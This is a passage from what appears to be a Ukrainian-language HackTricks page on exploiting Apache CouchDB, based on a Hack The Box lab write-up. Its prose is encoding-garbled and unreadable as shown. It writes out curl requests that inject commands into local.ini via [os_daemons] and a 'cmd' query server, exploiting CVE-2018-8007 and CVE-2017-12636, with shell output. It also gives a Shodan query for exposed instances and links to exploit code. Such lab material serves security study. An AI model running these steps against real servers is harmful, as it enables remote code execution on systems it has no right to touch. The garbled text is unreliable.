–∫–ª–∞—Å—Ç–µ—Ä–∞ Erlang. –¶—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ —Ñ–æ—Ä–º—É—î –º–µ—Ä–µ–∂—É, –¥–µ –∫–æ–∂–µ–Ω –≤—É–∑–æ–ª –ø–æ–≤'—è–∑–∞–Ω–∏–π –∑ –∫–æ–∂–Ω–∏–º —ñ–Ω—à–∏–º –≤—É–∑–ª–æ–º.

–í–∏–¥—ñ–ª—è—î—Ç—å—Å—è –≤–∞–∂–ª–∏–≤–µ –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è —â–æ–¥–æ –ø–æ—Ä—Ç—É `4369`. –Ø–∫—â–æ —Ü–µ–π –ø–æ—Ä—Ç —Å—Ç–∞–Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∏–º —á–µ—Ä–µ–∑ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç –∞–±–æ –±—É–¥—å-—è–∫—É –Ω–µ–Ω–∞–¥—ñ–π–Ω—É –º–µ—Ä–µ–∂—É, –±–µ–∑–ø–µ–∫–∞ —Å–∏—Å—Ç–µ–º–∏ –≤ –∑–Ω–∞—á–Ω—ñ–π –º—ñ—Ä—ñ –∑–∞–ª–µ–∂–∞—Ç–∏–º–µ –≤—ñ–¥ —É–Ω—ñ–∫–∞–ª—å–Ω–æ–≥–æ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä–∞, –≤—ñ–¥–æ–º–æ–≥–æ —è–∫ "cookie". –¶–µ–π cookie –≤–∏—Å—Ç—É–ø–∞—î —è–∫ –∑–∞—Ö–∏—Å—Ç. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —É –¥–∞–Ω–æ–º—É —Å–ø–∏—Å–∫—É –ø—Ä–æ—Ü–µ—Å—ñ–≤ –º–æ–∂–µ –±—É—Ç–∏ –ø–æ–º—ñ—á–µ–Ω–æ cookie –∑ –Ω–∞–∑–≤–æ—é "monster", —â–æ –≤–∫–∞–∑—É—î –Ω–∞ –π–æ–≥–æ —Ä–æ–±–æ—á—É —Ä–æ–ª—å —É —Å–∏—Å—Ç–µ–º—ñ –±–µ–∑–ø–µ–∫–∏.
```
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
–î–ª—è —Ç–∏—Ö, —Ö—Ç–æ –∑–∞—Ü—ñ–∫–∞–≤–ª–µ–Ω–∏–π —É —Ä–æ–∑—É–º—ñ–Ω–Ω—ñ —Ç–æ–≥–æ, —è–∫ —Ü–µ–π "cookie" –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É –Ω–∞ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ–º—É —Å–µ—Ä–≤–µ—Ä—ñ (RCE) –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ —Å–∏—Å—Ç–µ–º Erlang, —î –æ–∫—Ä–µ–º–∏–π —Ä–æ–∑–¥—ñ–ª –¥–ª—è –ø–æ–¥–∞–ª—å—à–æ–≥–æ —á–∏—Ç–∞–Ω–Ω—è. –í—ñ–Ω –¥–µ—Ç–∞–ª—å–Ω–æ –æ–ø–∏—Å—É—î –º–µ—Ç–æ–¥–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è cookie Erlang —É –Ω–µ—Å–∞–Ω–∫—Ü—ñ–æ–Ω–æ–≤–∞–Ω–∏—Ö —Å–ø–æ—Å–æ–±–∞—Ö –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –∫–æ–Ω—Ç—Ä–æ–ª—é –Ω–∞–¥ —Å–∏—Å—Ç–µ–º–∞–º–∏. –í–∏ –º–æ–∂–µ—Ç–µ **[–¥—ñ–∑–Ω–∞—Ç–∏—Å—è –±—ñ–ª—å—à–µ –ø—Ä–æ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è cookie Erlang –¥–ª—è RCE —Ç—É—Ç](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**.

### **–ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è CVE-2018-8007 —à–ª—è—Ö–æ–º –∑–º—ñ–Ω–∏ local.ini**

–ü—Ä–∏–∫–ª–∞–¥ [—Ç—É—Ç](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

–ù–µ–¥–∞–≤–Ω–æ –æ–ø—É–±–ª—ñ–∫–æ–≤–∞–Ω–∞ —É—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å, CVE-2018-8007, —â–æ –≤–ø–ª–∏–≤–∞—î –Ω–∞ Apache CouchDB, –±—É–ª–∞ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–∞, –≤–∏—è–≤–∏–≤—à–∏, —â–æ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –ø–æ—Ç—Ä—ñ–±–Ω—ñ –ø—Ä–∞–≤–∞ –Ω–∞ –∑–∞–ø–∏—Å —É —Ñ–∞–π–ª `local.ini`. –•–æ—á–∞ —Ü–µ –Ω–µ –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –¥–æ –ø–æ—á–∞—Ç–∫–æ–≤–æ—ó —Ü—ñ–ª—å–æ–≤–æ—ó —Å–∏—Å—Ç–µ–º–∏ —á–µ—Ä–µ–∑ –æ–±–º–µ–∂–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏, –±—É–ª–∏ –≤–Ω–µ—Å–µ–Ω—ñ –∑–º—ñ–Ω–∏ –¥–ª—è –Ω–∞–¥–∞–Ω–Ω—è –ø—Ä–∞–≤ –Ω–∞ –∑–∞–ø–∏—Å —É —Ñ–∞–π–ª `local.ini` –¥–ª—è –¥–æ—Å–ª—ñ–¥–Ω–∏—Ü—å–∫–∏—Ö —Ü—ñ–ª–µ–π. –ù–∏–∂—á–µ –Ω–∞–≤–µ–¥–µ–Ω–æ –¥–µ—Ç–∞–ª—å–Ω—ñ –∫—Ä–æ–∫–∏ —Ç–∞ –ø—Ä–∏–∫–ª–∞–¥–∏ –∫–æ–¥—É, —â–æ –¥–µ–º–æ–Ω—Å—Ç—Ä—É—é—Ç—å –ø—Ä–æ—Ü–µ—Å.

–°–ø–æ—á–∞—Ç–∫—É —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ –≥–æ—Ç—É—î—Ç—å—Å—è —à–ª—è—Ö–æ–º –ø–µ—Ä–µ–∫–æ–Ω–∞–Ω–Ω—è, —â–æ —Ñ–∞–π–ª `local.ini` –¥–æ—Å—Ç—É–ø–Ω–∏–π –¥–ª—è –∑–∞–ø–∏—Å—É, –ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω–æ —à–ª—è—Ö–æ–º –ø–µ—Ä–µ–ª—ñ–∫—É –¥–æ–∑–≤–æ–ª—ñ–≤:
```bash
root@canape:/home/homer/etc# ls -l
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
–î–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –∫–æ–º–∞–Ω–¥–∞ curl, —Å–ø—Ä—è–º–æ–≤–∞–Ω–∞ –Ω–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é `cors/origins` –≤ `local.ini`. –¶–µ –¥–æ–¥–∞—î –Ω–æ–≤–∏–π –ø–æ—á–∞—Ç–æ–∫ —Ä–∞–∑–æ–º –∑ –¥–æ–¥–∞—Ç–∫–æ–≤–∏–º–∏ –∫–æ–º–∞–Ω–¥–∞–º–∏ —É —Ä–æ–∑–¥—ñ–ª—ñ `[os_daemons]`, —Å–ø—Ä—è–º–æ–≤–∞–Ω–∏—Ö –Ω–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ –∫–æ–¥—É:
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
–ü–æ–¥–∞–ª—å—à–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø–æ–∫–∞–∑—É—î –≤–Ω–µ—Å–µ–Ω—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é –≤ `local.ini`, –ø–æ—Ä—ñ–≤–Ω—é—é—á–∏ —ó—ó –∑ —Ä–µ–∑–µ—Ä–≤–Ω–æ—é –∫–æ–ø—ñ—î—é, —â–æ–± –≤–∏–¥—ñ–ª–∏—Ç–∏ –∑–º—ñ–Ω–∏:
```bash
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
< [cors]
< origins = 0xdf
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
–ü–æ—á–∞—Ç–∫–æ–≤–æ –æ—á—ñ–∫—É–≤–∞–Ω–∏–π —Ñ–∞–π–ª (`/tmp/0xdf`) –Ω–µ —ñ—Å–Ω—É—î, —â–æ —Å–≤—ñ–¥—á–∏—Ç—å –ø—Ä–æ —Ç–µ, —â–æ –≤–∏–∫–ª–∏–∫–∞–Ω–∞ –∫–æ–º–∞–Ω–¥–∞ —â–µ –Ω–µ –≤–∏–∫–æ–Ω–∞–Ω–∞. –ü–æ–¥–∞–ª—å—à–µ —Ä–æ–∑—Å–ª—ñ–¥—É–≤–∞–Ω–Ω—è –ø–æ–∫–∞–∑—É—î, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –ø—Ä–æ—Ü–µ—Å–∏, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ CouchDB, –≤–∫–ª—é—á–∞—é—á–∏ —Ç–æ–π, —è–∫–∏–π –º–æ–∂–µ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –≤–∏–∫–æ–Ω–∞—Ç–∏ –≤–∏–∫–ª–∏–∫–∞–Ω—É –∫–æ–º–∞–Ω–¥—É:
```bash
root@canape:/home/homer/bin# ps aux | grep couch
```
–ü—Ä–∏ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—ñ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—É CouchDB —Ç–∞ –¥–æ–∑–≤–æ–ª—ñ —Å–∏—Å—Ç–µ–º—ñ –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–∏ –π–æ–≥–æ, –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–æ—ó –∫–æ–º–∞–Ω–¥–∏ —Å–ø—Ä–∞—Ü—å–æ–≤—É—î, —â–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î—Ç—å—Å—è –Ω–∞—è–≤–Ω—ñ—Å—Ç—é —Ä–∞–Ω—ñ—à–µ –≤—ñ–¥—Å—É—Ç–Ω—å–æ–≥–æ —Ñ–∞–π–ª—É:
```bash
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
–¶–µ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è CVE-2018-8007 –∑–∞ –ø–µ–≤–Ω–∏—Ö —É–º–æ–≤, –∑–æ–∫—Ä–µ–º–∞ –≤–∏–º–æ–≥—É –¥–æ –¥–æ—Å—Ç—É–ø—É –Ω–∞ –∑–∞–ø–∏—Å –¥–æ —Ñ–∞–π–ª—É `local.ini`. –ù–∞–¥–∞–Ω—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ –∫–æ–¥—É —Ç–∞ –ø—Ä–æ—Ü–µ–¥—É—Ä–Ω—ñ –∫—Ä–æ–∫–∏ –Ω–∞–¥–∞—é—Ç—å —á—ñ—Ç–∫–µ –∫–µ—Ä—ñ–≤–Ω–∏—Ü—Ç–≤–æ –¥–ª—è —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó –µ–∫—Å–ø–ª–æ–π—Ç—É –≤ –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ.

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –≤—ñ–¥–æ–º–æ—Å—Ç–µ–π –ø—Ä–æ CVE-2018-8007, –¥–∏–≤—ñ—Ç—å—Å—è —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ—ó –≤—ñ–¥ mdsec: [CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/).

### **–î–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è CVE-2017-12636 –∑ –ø—Ä–∞–≤–∞–º–∏ –Ω–∞ –∑–∞–ø–∏—Å —É local.ini**

–ü—Ä–∏–∫–ª–∞–¥ [–∑–≤—ñ–¥—Å–∏](https://0xdf.gitlab.io/2018/09/15/htb-canape.html).

–ë—É–ª–∞ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–∞ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –ø—ñ–¥ –Ω–∞–∑–≤–æ—é CVE-2017-12636, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É —á–µ—Ä–µ–∑ –ø—Ä–æ—Ü–µ—Å CouchDB, —Ö–æ—á–∞ –ø–µ–≤–Ω—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –º–æ–∂—É—Ç—å –∑–∞–ø–æ–±—ñ–≥—Ç–∏ —ó—ó –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—é. –ù–µ–∑–≤–∞–∂–∞—é—á–∏ –Ω–∞ –Ω–∞—è–≤–Ω—ñ—Å—Ç—å —á–∏—Å–ª–µ–Ω–Ω–∏—Ö –ø–æ—Å–∏–ª–∞–Ω—å –Ω–∞ Proof of Concept (POC) –≤ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ, –Ω–µ–æ–±—Ö—ñ–¥–Ω—ñ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤ CouchDB –≤–µ—Ä—Å—ñ—ó 2, –≤—ñ–¥–º—ñ–Ω–Ω–æ—ó –≤—ñ–¥ –∑–∞–≥–∞–ª—å–Ω–æ —Ü—ñ–ª–µ–π –≤–µ—Ä—Å—ñ—ó 1.x. –ü–æ—á–∞—Ç–∫–æ–≤—ñ –∫—Ä–æ–∫–∏ –≤–∫–ª—é—á–∞—é—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –≤–µ—Ä—Å—ñ—ó CouchDB —Ç–∞ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –≤—ñ–¥—Å—É—Ç–Ω–æ—Å—Ç—ñ –æ—á—ñ–∫—É–≤–∞–Ω–æ–≥–æ —à–ª—è—Ö—É –∑–∞–ø–∏—Ç—ñ–≤ —Å–µ—Ä–≤–µ—Ä—ñ–≤:
```bash
curl http://localhost:5984
curl http://0xdf:df@localhost:5984/_config/query_servers/
```
–î–ª—è –ø—Ä–∏—Å—Ç–æ—Å—É–≤–∞–Ω–Ω—è –¥–æ –≤–µ—Ä—Å—ñ—ó CouchDB 2.0 –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –Ω–æ–≤–∏–π —à–ª—è—Ö:
```bash
curl 'http://0xdf:df@localhost:5984/_membership'
curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
```
–°–ø—Ä–æ–±–∏ –¥–æ–¥–∞—Ç–∏ —Ç–∞ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –Ω–æ–≤–∏–π —Å–µ—Ä–≤–µ—Ä –∑–∞–ø–∏—Ç—ñ–≤ –∑—É—Å—Ç—Ä—ñ–ª–∏—Å—è –∑ –ø–æ–º–∏–ª–∫–∞–º–∏, –ø–æ–≤'—è–∑–∞–Ω–∏–º–∏ –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏, —è–∫ —Ü–µ –≤–∫–∞–∑–∞–Ω–æ —É –Ω–∞—Å—Ç—É–ø–Ω–æ–º—É –≤–∏–≤–æ–¥—ñ:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
–ü–æ–¥–∞–ª—å—à–µ —Ä–æ–∑—Å–ª—ñ–¥—É–≤–∞–Ω–Ω—è –≤–∏—è–≤–∏–ª–æ –ø—Ä–æ–±–ª–µ–º–∏ –∑ –¥–æ–∑–≤–æ–ª–∞–º–∏ —É —Ñ–∞–π–ª—ñ `local.ini`, —è–∫–∏–π –Ω–µ –º–æ–∂–Ω–∞ –±—É–ª–æ –∑–º—ñ–Ω—é–≤–∞—Ç–∏. –ó–º—ñ–Ω–∏–≤—à–∏ –¥–æ–∑–≤–æ–ª–∏ —Ñ–∞–π–ª—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –¥–æ—Å—Ç—É–ø—É root –∞–±–æ homer, —Å—Ç–∞–ª–æ –º–æ–∂–ª–∏–≤–∏–º –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏:
```bash
cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
chmod 666 /home/homer/etc/local.ini
```
–ü—ñ—Å–ª—è —Ü—å–æ–≥–æ —Å–ø—Ä–æ–±–∏ –¥–æ–¥–∞—Ç–∏ –∑–∞–ø–∏—Ç —Å–µ—Ä–≤–µ—Ä–∞ –±—É–ª–∏ —É—Å–ø—ñ—à–Ω–∏–º–∏, —è–∫ —Ü–µ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂—É—î—Ç—å—Å—è –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—é –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å –ø—Ä–æ –ø–æ–º–∏–ª–∫–∏ —É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ. –£—Å–ø—ñ—à–Ω–µ –∑–º—ñ–Ω–µ–Ω–Ω—è —Ñ–∞–π–ª—É `local.ini` –±—É–ª–æ –ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–æ –ø–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è–º —Ñ–∞–π–ª—ñ–≤:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
```
–ü—Ä–æ—Ü–µ—Å –ø—Ä–æ–¥–æ–≤–∂—É–≤–∞–≤—Å—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è–º –±–∞–∑–∏ –¥–∞–Ω–∏—Ö —Ç–∞ –¥–æ–∫—É–º–µ–Ω—Ç–∞, –∑–∞ —è–∫–∏–º —Å–ª—ñ–¥—É–≤–∞–ª–∞ —Å–ø—Ä–æ–±–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥ —á–µ—Ä–µ–∑ –≤–ª–∞—Å–Ω–µ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –≤–∏–¥—É, —è–∫–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –Ω–æ–≤—ñ–π –¥–æ–¥–∞–Ω—ñ–π —Å–µ—Ä–≤–µ—Ä–Ω—ñ–π –∑–∞–ø–∏—Ç—É:
```bash
curl -X PUT 'http://0xdf:df@localhost:5984/df'
curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}'
```
**[–û–ø–∏—Å](https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0)** –∑ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∏–º –ø–µ–π–ª–æ—É–¥–æ–º –Ω–∞–¥–∞—î –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –≤—ñ–¥–æ–º–æ—Å—Ç—ñ –ø—Ä–æ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—é CVE-2017-12636 –≤ –ø–µ–≤–Ω–∏—Ö —É–º–æ–≤–∞—Ö. **–ö–æ—Ä–∏—Å–Ω—ñ —Ä–µ—Å—É—Ä—Å–∏** –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ü—ñ—î—ó –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤–∫–ª—é—á–∞—é—Ç—å:

- [–ö–æ–¥ –µ–∫—Å–ø–ª–æ—ñ—Ç—É POC](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
- [–ó–∞–ø–∏—Å —É –±–∞–∑—ñ –¥–∞–Ω–∏—Ö –µ–∫—Å–ø–ª–æ—ñ—Ç—ñ–≤](https://www.exploit-db.com/exploits/44913/)

## Shodan

* `port:5984 couchdb`

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html](https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html)
* [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF** –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
